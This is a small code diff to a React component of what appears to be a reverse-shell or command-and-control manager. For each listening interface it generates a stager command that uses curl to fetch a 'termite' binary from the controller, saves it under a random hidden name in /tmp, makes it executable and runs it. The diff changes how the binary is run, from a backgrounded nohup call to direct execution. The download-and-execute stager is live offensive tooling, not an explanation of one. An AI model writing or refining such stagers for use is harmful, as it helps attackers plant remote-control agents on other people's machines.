@@ -405,7 +405,7 @@ class App extends React.Component {
             Object.values(this.state.currentServer.interfaces).map((value, index) => {
               filename = "/tmp/." + randomstring.generate(4)
               target = value + ":" + this.state.currentServer.port
-              command = "curl -fsSL " + url + "/termite/"  + target + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
+              command = "curl -fsSL " + url + "/termite/"  + target + " -o " + filename + " && chmod +x " + filename + " && " + filename
               data.push({ target: value + ":" + this.state.currentServer.port, command: command })
               return command
             })
